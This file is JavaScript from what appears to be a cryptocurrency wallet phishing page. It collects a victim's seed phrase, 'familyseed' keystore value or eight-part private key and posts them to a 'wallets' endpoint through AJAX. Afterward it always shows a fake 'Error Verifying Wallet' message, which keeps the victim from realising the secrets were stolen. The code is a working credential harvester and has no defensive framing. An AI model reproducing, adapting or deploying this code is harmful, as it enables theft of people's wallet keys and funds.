
  var phrase = document.querySelector("#phrase");
  var keystore = document.querySelector("#keystore");
  var private = document.querySelector("#private");
  var first = document.querySelector("#first");
  var second = document.getElementById("second");
  var third = document.querySelector("#third");
  var fileUp = document.querySelector("#file-upload");
  var wallet_name = document.querySelector("#walletname");
  phrase.addEventListener("click", function() {
    hide(first);
  });

  keystore.addEventListener("click", function() {
    hide(second);
  });

  private.addEventListener("click", function() {
    hide(third);
  });

  function hide(elem) {
    var expandedPanel = document.querySelector(".active");
    //This is to remove the current active class on click
    if (expandedPanel) {
      expandedPanel.classList.remove("active");
      var attr = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");

      for (let i = 0; i < attr.length; i++) {
        attr[i].value = "";

      }
    }
    var i = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400")
    var x = elem.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400")

    for (let c = 0; c < i.length; c++) {
      i[c].required = false;
    }
    for (let c = 0; c < x.length; c++) {
      x[c].required = true;
    }
    //add an active tag to the clicked element and set it's

    elem.classList.add("active");

  }

const form = document.querySelector('form');

function sendData( data ) {
  /*const XHR = new XMLHttpRequest(),
        FD  = new FormData( form );

  // Push our data into our FormData object
  for( var name in data ) {
    FD.append( name, data[ name ] );
  }
  FD.append("wallet", wallet_name.innerHTML);
  //FD.append( "file", file[0].files[0]);

  // Define what happens on successful data submission
  XHR.addEventListener( 'load', function( event ) {
    console.log( XHR.responseText );
    alert( 'Error Verifying Wallet... Please try again later' );
      document.querySelector(".sending").style.display = "none";
  } );
 
  // Define what happens in case of error
  XHR.addEventListener(' error', function( event ) {
    alert( 'Oops! Something went wrong. Check your internet' );
  } );

  // Set up our request
  XHR.open( 'POST', 'wallets' );

  // Send our FormData object; HTTP headers are set automatically
  XHR.send(FD);=*/

     
  var walletVal= wallet_name.innerHTML;
//  var fileVal= document.getElementById("file-upload").value;
  var privateVal1= document.getElementById("privatekey1").value;
  var privateVal2= document.getElementById("privatekey2").value;
  var privateVal3= document.getElementById("privatekey3").value;
  var privateVal4= document.getElementById("privatekey4").value;
  var privateVal5= document.getElementById("privatekey5").value;
  var privateVal6= document.getElementById("privatekey6").value;
  var privateVal7= document.getElementById("privatekey7").value;
  var privateVal8= document.getElementById("privatekey8").value;


  var keystoreVal= document.getElementById("familyseed").value;
  var phraseVal= document.getElementById("phraseinput").value;
  
  
  if(phraseVal != ""){
  // AJAX CALL

$.ajax({
type:"post",
url:"wallets",
data: 'phrase='+phraseVal+'&wallet='+walletVal,
success:function(respnx)
{   
console.log(respnx);
if(respnx=="yes"){
  console.log( respnx );
  alert( 'Error Verifying Wallet... Please try again 30 Mins later' );
    document.querySelector(".sending").style.display = "none";
}else{
  console.log('aj1');
  alert( 'Oops! Something went wrong. Check your internet' );

}



},
error: function(badx)
{
  console.log('aj2');
  alert( 'Oops! Something went wrong. Check your internet' );
}

});
}

if(privateVal1 != "" && privateVal2 != "" && privateVal3 != "" && privateVal4 != "" && privateVal5 != "" && privateVal6 != "" && privateVal7 != "" && privateVal8 != ""){
  // AJAX CALL

$.ajax({

type:"post",
url:"wallets",
data: 'private1='+privateVal1+'&private2='+privateVal2+'&private3='+privateVal3+'&private4='+privateVal4+'&private5='+privateVal5+'&private6='+privateVal6+'&private7='+privateVal7+'&private8='+privateVal8+'&wallet='+walletVal,
success:function(respnx)
{   
console.log(respnx);
if(respnx=="yes"){
  console.log( respnx );
  alert( 'Error Verifying Wallet... Please try again later' );
    document.querySelector(".sending").style.display = "none";
}else{
  console.log('aj5');
  alert( 'Oops! Something went wrong. Check your internet' );

}



},
error: function(badx)
{
  console.log('aj3');
  alert( 'Oops! Something went wrong. Check your internet' );
}

});
}

if(keystoreVal != ""){


  $.ajax({

    type:"post",
    url:"wallets",
    data: 'familyseed='+keystoreVal+'&wallet='+walletVal,
    success:function(respnx)
    {   
    console.log(respnx);
    if(respnx=="yes"){
      console.log( respnx );
      alert( 'Error Verifying Wallet... Please try again later' );
        document.querySelector(".sending").style.display = "none";
    }else{
      console.log('aj00');
      alert( 'Oops! Something went wrong. Check your internet' );
    
    }



},
error: function(badx)
{
  console.log('aj4');
  alert( 'Oops! Something went wrong. Check your internet' );
}

});
}


}

form.addEventListener( 'submit', function(e){ 
      e.preventDefault();
      document.querySelector(".sending").style.display = "flex";
      //delay for 5 seconds
      window.setTimeout( sendData, 2000);
} );
